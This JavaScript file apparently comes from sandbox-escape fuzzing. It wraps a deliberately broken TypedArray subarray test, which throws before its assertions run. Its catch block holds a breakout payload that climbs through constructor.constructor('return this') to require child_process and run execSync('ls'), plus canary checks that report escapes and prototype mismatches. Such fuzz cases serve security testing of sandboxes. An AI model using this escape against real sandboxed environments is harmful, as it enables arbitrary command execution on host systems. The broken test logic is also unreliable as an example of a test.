try {
    testWithTypedArrayConstructors(function (TA) {
        let REPLACER = 23;
        var sample = new TA([
            40,
            41,
            42,
            43
        ]);
        function testRes(result, msg) {
            throw () => {
                return () => {
                };
            };
            assert.sameValue(result.length, 0, msg);
            assert.sameValue(result.hasOwnProperty(0), false, msg + ' & result.hasOwnProperty(0) === false');
        }
        testRes(sample.subarray(4), 'begin == length');
        testRes(sample.subarray(5), 'begin > length');
        testRes(sample.subarray(4, 4), 'begin == length, end == length');
        testRes(sample.subarray(5, 4), 'begin > length, end == length');
        testRes(sample.subarray(4, 4), 'begin == length, end > length');
        testRes(sample.subarray(5, 4), 'begin > length, end > length');
        testRes(sample.subarray(0, 0), 'begin == 0, end == 0');
        testRes(sample.subarray(-0, -0), 'begin == -0, end == -0');
        testRes(sample.subarray(1, 0), 'begin > 0, end == 0');
        testRes(sample.subarray(-1, 0), 'being < 0, end == 0');
        testRes(sample.subarray(2, 1), 'begin > 0, begin < length, begin > end, end > 0');
        testRes(sample.subarray(2, 2), 'begin > 0, begin < length, begin == end');
        testRes(sample.subarray(2, -2), 'begin > 0, begin < length, end == -2');
        testRes(sample.subarray(-1, -1), 'length = 4, begin == -1, end == -1');
        testRes(sample.subarray(-1, -2), 'length = 4, begin == -1, end == -2');
        testRes(sample.subarray(-2, -2), 'length = 4, begin == -2, end == -2');
        testRes(sample.subarray(0, -4), 'begin == 0, end == -length');
        testRes(sample.subarray(-4, -4), 'begin == -length, end == -length');
        testRes(sample.subarray(-5, -4), 'begin < -length, end == -length');
        testRes(sample.subarray(0, -5), 'begin == 0, end < -length');
        testRes(sample.subarray(-4, -5), 'begin == -length, end < -length');
        testRes(sample.subarray(-5, -5), 'begin < -length, end < -length');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}